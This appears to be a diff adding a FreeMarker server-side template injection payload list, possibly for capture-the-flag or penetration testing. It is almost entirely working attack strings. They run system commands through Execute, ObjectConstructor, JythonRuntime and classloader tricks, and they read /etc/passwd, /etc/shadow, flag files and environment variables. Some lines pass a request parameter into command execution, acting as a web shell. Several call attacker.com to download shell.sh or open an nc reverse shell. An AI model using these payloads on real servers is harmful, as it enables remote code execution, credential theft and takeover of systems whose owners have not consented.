@@ -1,0 +1,161 @@
+${7*7}
+${7*'7'}
+${"freemarker.template.utility.Execute"?new()("id")}
+${"freemarker.template.utility.Execute"?new()("whoami")}
+${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
+${"freemarker.template.utility.Execute"?new()("ls -la")}
+${"freemarker.template.utility.Execute"?new()("uname -a")}
+${"freemarker.template.utility.Execute"?new()("pwd")}
+${"freemarker.template.utility.Execute"?new()("env")}
+${"freemarker.template.utility.Execute"?new()("cat flag.txt")}
+${"freemarker.template.utility.Execute"?new()("ps aux")}
+${"freemarker.template.utility.Execute"?new()("ifconfig")}
+${"freemarker.template.utility.Execute"?new()("netstat -an")}
+${"freemarker.template.utility.Execute"?new()("cat /etc/shadow")}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","whoami").start()}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.io.File","/etc/passwd")}
+${"freemarker.template.utility.JythonRuntime"?new().exec("id")}
+${"freemarker.template.utility.JythonRuntime"?new().eval("1+1")}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /etc/passwd") }
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("ls -la") }
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("uname -a") }
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("pwd") }
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("env") }
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat flag.txt") }
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("ps aux") }
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("ifconfig") }
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("netstat -an") }
+<#assign classloader=object?class.protectionDomain.classLoader>
+<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
+<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
+<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
+${dwf.newInstance(ec,null)("id")}
+${object.getClass()}
+${object.getClass().getClassLoader()}
+${object.getClass().getProtectionDomain()}
+${object.getClass().getProtectionDomain().getCodeSource()}
+${object.getClass().getProtectionDomain().getClassLoader()}
+<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
+${value("java.lang.ProcessBuilder","id").start()}
+<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
+${value("java.lang.ProcessBuilder","whoami").start()}
+<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
+${value("java.lang.ProcessBuilder","cat","/etc/passwd").start()}
+<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
+${value("java.io.File","/etc/passwd").exists()}
+<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
+${value("java.io.File","/").list()}
+<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
+${value("java.io.File","/etc/passwd")}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.io.File","/etc/passwd").exists()}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.io.File","/").list()}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.io.File","/").listFiles()}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["sh","-c","id"]).start()}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["bash","-c","id"]).start()}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["/bin/sh","-c","id"]).start()}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["/bin/bash","-c","id"]).start()}
+<#assign command="id">
+${"freemarker.template.utility.Execute"?new()(command)}
+<#assign command="whoami">
+${"freemarker.template.utility.Execute"?new()(command)}
+<#assign command="cat /etc/passwd">
+${"freemarker.template.utility.Execute"?new()(command)}
+${.version}
+${.data_model}
+${.globals}
+${.locale}
+${.now}
+${.current_node}
+${.main}
+${.namespace}
+${.output_encoding}
+${.url_escaping_charset}
+${.vars}
+${.lang}
+<#assign uri=object?class.getResource("/").toURI()>
+<#assign input=uri?class.getConstructor(uri?class).newInstance(uri).toURL().openStream()>
+<#assign scanner=input?class.getModule().getClassLoader().loadClass("java.util.Scanner").getConstructor(input?class).newInstance(input).useDelimiter("\\A")>
+${scanner.next()}
+${"freemarker.template.utility.Execute"?new()("touch /tmp/pwned")}
+${"freemarker.template.utility.Execute"?new()("wget http://attacker.com/shell.sh -O /tmp/shell.sh")}
+${"freemarker.template.utility.Execute"?new()("curl http://attacker.com/shell.sh -o /tmp/shell.sh")}
+${"freemarker.template.utility.Execute"?new()("nc attacker.com 4444 -e /bin/bash")}
+<#assign classloader=object?class.protectionDomain.classLoader>
+<#assign clazz=classloader.loadClass("freemarker.template.utility.Execute")>
+<#assign obj=clazz?new()>
+${obj("id")}
+<#assign classloader=object?class.protectionDomain.classLoader>
+<#assign clazz=classloader.loadClass("java.lang.Runtime")>
+<#assign runtime=clazz.getRuntime()>
+${runtime.exec("id")}
+<#assign classloader=object?class.protectionDomain.classLoader>
+<#assign clazz=classloader.loadClass("java.lang.ProcessBuilder")>
+<#assign constructor=clazz.getConstructor(classloader.loadClass("[Ljava.lang.String;"))>
+<#assign process=constructor.newInstance(["id"])>
+${process.start()}
+${"freemarker.template.utility.Execute"?new()("cat${IFS}/etc/passwd")}
+${"freemarker.template.utility.Execute"?new()("cat$IFS/etc/passwd")}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["sh","-c","cat</etc/passwd"]).start()}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["sh","-c","cat<flag.txt"]).start()}
+<#assign ex="freemarker.template.utility.Execute"?new()>
+${ex("cat${IFS}/etc/passwd")}
+<#assign ex="freemarker.template.utility.Execute"?new()>
+${ex("cat$IFS/etc/passwd")}
+<#assign system=object?class.protectionDomain.classLoader.loadClass("java.lang.System")>
+${system.getProperty("user.name")}
+<#assign system=object?class.protectionDomain.classLoader.loadClass("java.lang.System")>
+${system.getProperty("user.home")}
+<#assign system=object?class.protectionDomain.classLoader.loadClass("java.lang.System")>
+${system.getProperty("user.dir")}
+<#assign system=object?class.protectionDomain.classLoader.loadClass("java.lang.System")>
+${system.getProperty("os.name")}
+<#assign system=object?class.protectionDomain.classLoader.loadClass("java.lang.System")>
+${system.getProperty("os.version")}
+<#assign system=object?class.protectionDomain.classLoader.loadClass("java.lang.System")>
+${system.getProperty("java.version")}
+<#assign system=object?class.protectionDomain.classLoader.loadClass("java.lang.System")>
+${system.getProperty("java.home")}
+<#assign system=object?class.protectionDomain.classLoader.loadClass("java.lang.System")>
+${system.getenv()}
+<#assign system=object?class.protectionDomain.classLoader.loadClass("java.lang.System")>
+${system.getenv("PATH")}
+<#assign system=object?class.protectionDomain.classLoader.loadClass("java.lang.System")>
+${system.getenv("HOME")}
+<#assign system=object?class.protectionDomain.classLoader.loadClass("java.lang.System")>
+${system.getenv("USER")}
+${"freemarker.template.utility.Execute"?new()("calc")}
+${"freemarker.template.utility.Execute"?new()("cmd /c calc")}
+${"freemarker.template.utility.Execute"?new()("cmd /c dir")}
+${"freemarker.template.utility.Execute"?new()("powershell.exe")}
+${"freemarker.template.utility.Execute"?new()("cmd.exe /c whoami")}
+<#assign ex="freemarker.template.utility.Execute"?new()>
+${ex("cmd /c whoami")}
+<#assign ex="freemarker.template.utility.Execute"?new()>
+${ex("powershell -c whoami")}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["cmd","/c","whoami"]).start()}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["powershell","-c","whoami"]).start()}
+<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
+${value("java.lang.Runtime").getRuntime().exec("id")}
+<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
+${value("java.lang.Runtime").getRuntime().exec("whoami")}
+<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
+${value("java.lang.Runtime").getRuntime().exec("cat /etc/passwd")}
+${"freemarker.template.utility.Execute"?new()(request.getParameter("cmd"))}
+<#assign ex="freemarker.template.utility.Execute"?new()>
+${ex(request.getParameter("cmd"))}
+<#assign ex="freemarker.template.utility.Execute"?new()>
+${ex(.data_model.cmd)}
+${"freemarker.template.utility.JythonRuntime"?new().exec("import os;os.system('id')")}
+${"freemarker.template.utility.JythonRuntime"?new().eval("__import__('os').system('id')")}
+<#assign jython="freemarker.template.utility.JythonRuntime"?new()>
+${jython.exec("import os;os.system('id')")}
+<#assign jython="freemarker.template.utility.JythonRuntime"?new()>
+${jython.eval("__import__('os').system('id')")}
+<#include "/etc/passwd">
+<#include "flag.txt">
+<#import "/etc/passwd" as passwd>
+<#setting url_escaping_charset="UTF-8">
+<#setting output_encoding="UTF-8">
